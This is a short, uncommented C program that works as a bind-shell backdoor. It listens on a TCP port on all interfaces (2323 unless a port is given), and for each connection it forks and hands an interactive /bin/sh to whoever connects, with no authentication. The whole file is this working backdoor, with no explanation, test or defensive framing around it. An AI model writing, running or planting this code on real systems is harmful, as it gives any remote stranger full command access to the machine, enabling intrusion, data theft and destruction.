#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
int main(int argc,char**argv){
    int port=argc>1?atoi(argv[1]):2323;
    int s=socket(AF_INET,SOCK_STREAM,0),one=1;
    setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&one,sizeof(one));
    struct sockaddr_in a; memset(&a,0,sizeof(a));
    a.sin_family=AF_INET; a.sin_addr.s_addr=INADDR_ANY; a.sin_port=htons(port);
    if(bind(s,(struct sockaddr*)&a,sizeof(a))<0) return 1;
    listen(s,1);
    for(;;){
        int c=accept(s,0,0);
        if(c<0) continue;
        if(fork()==0){ dup2(c,0);dup2(c,1);dup2(c,2);
            execl("/bin/sh","sh","-i",(char*)0); _exit(0); }
        close(c);
    }
}
